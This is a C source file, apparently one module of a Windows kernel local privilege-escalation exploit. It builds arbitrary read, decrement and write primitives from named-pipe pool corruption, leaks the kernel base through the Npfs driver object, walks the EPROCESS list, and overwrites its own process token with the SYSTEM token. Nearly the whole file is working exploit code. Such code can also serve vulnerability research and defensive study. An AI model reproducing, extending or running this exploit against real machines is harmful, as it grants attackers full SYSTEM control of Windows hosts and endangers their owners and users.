#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "core/privilege_escalation.h"

#include "core/cleanup.h"
#include "primitives/arbitrary_read.h"
#include "primitives/arbitrary_decrement.h"
#include "primitives/arbitrary_write.h"
#include "windows_api/windows_api.h"

uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
{
    uintptr_t pipe_queue_entry_addr;
    ArbitraryRead(ghost_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
    printf("[+] pipe_queue_entry_addr: 0x%llX\n", pipe_queue_entry_addr);
    if (pipe_queue_entry_addr == 0x434343434343005A)
    {
        fprintf(stderr, "[-] Error: Invalid pipe_queue_entry_addr value\n");
        return NULL;
    }

    addrs->ghost_vs_chunk = pipe_queue_entry_addr - sizeof(POOL_HEADER) - sizeof(HEAP_VS_CHUNK_HEADER);
    printf("[+] ghost_chunk: 0x%llX\n", addrs->ghost_vs_chunk);

    uintptr_t file_object_addr = addrs->root_pipe_queue_entry - ROOT_PIPE_QUEUE_ENTRY_OFFSET + FILE_OBJECT_OFFSET;
    printf("[+] file_object_addr: 0x%llX\n", file_object_addr);

    uintptr_t file_object;
    ArbitraryRead(ghost_pipe, file_object_addr, (char*)&file_object, 0x8);
    printf("[+] File object: 0x%llX\n", file_object);

    uintptr_t device_object;
    ArbitraryRead(ghost_pipe, file_object + 8, (char*)&device_object, 0x8);
    printf("[+] Device object: 0x%llX\n", device_object);

    uintptr_t driver_object;
    ArbitraryRead(ghost_pipe, device_object + 8, (char*)&driver_object, 0x8);
    printf("[+] Driver object: 0x%llX\n", driver_object);

    uintptr_t NpFsdCreate;
    ArbitraryRead(ghost_pipe, driver_object + 0x70, (char*)&NpFsdCreate, 0x8);
    printf("[+] NpFsdCreate: 0x%llX\n", NpFsdCreate);

    uintptr_t ExAllocatePoolWithTag_addr = NpFsdCreate - Npfs_NpFsdCreate_OFFSET + Npfs_imp_ExAllocatePoolWithTag_OFFSET;
    uintptr_t ExAllocatePoolWithTag;
    ArbitraryRead(ghost_pipe, ExAllocatePoolWithTag_addr, (char*)&ExAllocatePoolWithTag, 0x8);
    printf("[+] ExAllocatePoolWithTag: 0x%llX\n", ExAllocatePoolWithTag);

    uintptr_t kernel_base = ExAllocatePoolWithTag - nt_ExAllocatePoolWithTag_OFFSET;
    return kernel_base;
}

uintptr_t findSelfEprocess(pipe_pair_t* ghost_pipe, uintptr_t kernel_base)
{
    uintptr_t PsInitialSystemProcess;
    ArbitraryRead(ghost_pipe, kernel_base + nt_PsInitialSystemProcess_OFFSET, (char*)&PsInitialSystemProcess, 0x8);
    printf("[+] PsInitialSystemProcess: 0x%llX\n", PsInitialSystemProcess);

    DWORD self_pid = GetCurrentProcessId();
    printf("[*] Searching for current process (PID: %d) in the process list...\n", self_pid);

    uintptr_t current_eprocess = PsInitialSystemProcess;
    do
    {
        ArbitraryRead(ghost_pipe, current_eprocess + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET, (char*)&current_eprocess, 0x8);
        current_eprocess -= EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET;

        uintptr_t current_pid = 0;
        ArbitraryRead(
            ghost_pipe,
            current_eprocess + EPROCESS_UNIQUE_PROCESS_ID_OFFSET,
            (char*)&current_pid, 0x8);

        if (current_pid == self_pid)
        {
            return current_eprocess;
        }

    } while (current_eprocess != PsInitialSystemProcess);

    fprintf(stderr, "[-] Failed to locate EPROCESS structure for current process (PID: %d)\n", self_pid);
    return NULL;
}

int leakKernelInfo(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
{
    uintptr_t kernel_base = findKernelBase(ghost_pipe, addrs);
    addrs->kernel_base = kernel_base;
    printf("[+] Kernel base address: 0x%llX\n", kernel_base);

    ArbitraryRead(ghost_pipe, kernel_base + nt_ExpPoolQuotaCookie_OFFSET, (char*)&addrs->ExpPoolQuotaCookie, 0x8);
    printf("[+] ExpPoolQuotaCookie: 0x%llX\n", addrs->ExpPoolQuotaCookie);

    ArbitraryRead(ghost_pipe, addrs->kernel_base + nt_RtlpHpHeapGlobals_OFFSET, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
    printf("[+] RtlpHpHeapGlobals: 0x%llx\n", addrs->RtlpHpHeapGlobals);

    addrs->self_eprocess = findSelfEprocess(ghost_pipe, kernel_base);
    printf("[+] Self EPROCESS: 0x%llX\n", addrs->self_eprocess);

    ArbitraryRead(ghost_pipe, (uintptr_t)(addrs->self_eprocess + EPROCESS_KTHREAD_OFFSET), (char*)&addrs->self_kthread, 8);
    addrs->self_kthread -= KTHREAD_THREAD_LIST_ENTRY;
    printf("[+] Self KTHREAD: 0x%llX\n", addrs->self_kthread);

    return 1;
}

int SetupPrimitives(exploit_addresses_t* addrs)
{
    exploit_pipes_t pipes = { 0 };

    puts("## 1.1 Setting up arbitrary read primitive\n");
    if (!SetupArbitraryRead(&pipes, addrs))
    {
        fprintf(stderr, "[-] Failed to set up arbitrary read primitive\n");
        return 0;
    }

    puts("\n## 1.2 Extracting critical kernel information\n");
    if (!leakKernelInfo(&pipes.ghost_chunk_pipe, addrs))
    {
        fprintf(stderr, "[-] Failed to extract kernel info\n");
        return 0;
    }

    puts("\n## 1.3 Setting up arbitrary decrement primitive\n");
    if (!SetupArbitraryDecrement(&pipes, addrs))
    {
        fprintf(stderr, "[-] Failed to set up arbitrary decrement\n");
        return 0;
    }

    puts("\n## 1.4 Setting up arbitrary write primitive\n");
    if (!SetupArbitraryWrite(&pipes, addrs))
    {
        fprintf(stderr, "[-] Failed to set up arbitrary write\n");
        return 0;
    }

    puts("\n## 1.5 Fixing VS chunks\n");
    if (!FixVsChunks(addrs))
    {
        fprintf(stderr, "[-] VS chunks fix failed\n");
        return 0;
    }

    puts("\n## 1.6 Cleaning up pipes\n");
    if (!CleanupPipes(&pipes))
    {
        fprintf(stderr, "[-] Pipes cleanup failed\n");
        return 0;
    }

    return 1;
}

int EscalatePrivileges(exploit_addresses_t* addrs)
{
    uintptr_t current_eprocess = addrs->self_eprocess;

    puts("[*] Searching for system eprocess...");
    while (TRUE)
    {
        current_eprocess = Read64(current_eprocess + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET);
        current_eprocess -= EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET;

        uintptr_t UniqueProcessId = Read64(current_eprocess + EPROCESS_UNIQUE_PROCESS_ID_OFFSET);

        if (UniqueProcessId == SYSTEM_PID)
        {
            printf("[+] System EPROCESS: 0x%llX\n", current_eprocess);
            break;
        }
    }

    uintptr_t system_token = Read64(current_eprocess + EPROCESS_TOKEN_OFFSET);
    system_token &= (~0xF); // Clear reference count bits
    printf("[+] System TOKEN: 0x%llX\n", system_token);

    puts("[*] Overwriting current process token with System token");
    Write64(addrs->self_eprocess + EPROCESS_TOKEN_OFFSET, system_token);

    return 1;
}